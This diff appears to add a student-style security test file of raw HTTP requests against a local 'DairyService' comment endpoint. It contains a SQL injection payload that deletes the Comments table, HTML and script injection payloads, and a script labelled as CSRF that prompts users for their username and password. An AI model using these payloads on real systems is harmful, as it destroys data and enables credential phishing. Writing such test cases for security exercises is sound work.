@@ -1,0 +1,61 @@
+-N01
+POST http://localhost:8188/DairyService.svc/comment?name=deleteTableContents
+Host: http://localhost:8188/
+Content-Type: application/json; charset=utf-8
+Content-Length: 37
+
+', '::P'); DELETE FROM Comments; --
+
+-N02
+POST http://localhost:8188/DairyService.svc/comment?name=robber
+Host: http://localhost:8189/
+Content-Type: application/json; charset=utf-8
+Content-Length: 99
+
+Click here to get <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">get Rickrolled!</a>
+
+-N03
+POST http://localhost:8188/DairyService.svc/comment?name=robber
+Host: http://localhost:8189/
+Content-Type: application/json; charset=utf-8
+Content-Length: 74
+
+<img src="https://thumbs.dreamstime.com/z/online-robber-17098197.jpg" alt="stock image robber">
+
+-N04
+POST http://localhost:8188/DairyService.svc/comment?name=robber
+Host: http://localhost:8189/
+Content-Type: application/json; charset=utf-8
+Content-Length: 68
+
+test a script <script>alert("I am here to annoy you");</script>
+
+-N05
+A CSRF could be mounted to the site via the guest book which can trick future users to log in first before continuing to purchase items.
+
+-N06
+POST http://localhost:8188/DairyService.svc/comment?name=CSRFAttack
+Host: http://localhost:8189/
+Content-Type: application/json; charset=utf-8
+Content-Length: 380
+
+CSRF script
+<script>
+  name = prompt("Please enter your username:", "");
+  password = prompt("Please enter your password:", "");
+  if (name == "" || password == "") {
+    alert("You have chosen not to log on immediately.");
+  } else {
+    alert("Your login credentials are stolen! \nYour username: " + name + "\nYour password: " + password);
+  }
+</script>
+
+-C01
+
+-C02
+
+-C03
+
+-C04
+
+-C05
